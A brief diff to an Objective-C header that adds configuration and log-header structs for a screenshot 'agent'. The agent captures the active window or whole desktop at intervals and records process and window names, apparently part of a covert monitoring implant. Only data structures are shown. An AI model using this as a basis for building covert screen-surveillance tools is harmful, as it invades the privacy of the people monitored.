@@ -17,6 +17,20 @@
 
 #import "RCSMLogManager.h"
 
+typedef struct _screenshot {
+  u_int sleepTime;
+  u_int dwTag;
+  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
+  u_int grabNewWindows; // 1 TRUE onNewWindow - 0 FALSE
+} screenshotStruct;
+
+typedef struct _screenshotHeader {
+	u_int version;
+#define LOG_SCREENSHOT_VERSION 2009031201
+	u_int processNameLength;
+	u_int windowNameLength;
+} screenshotAdditionalStruct;
+
 
 @interface RCSMAgentScreenshot : NSObject <Agents>
 {
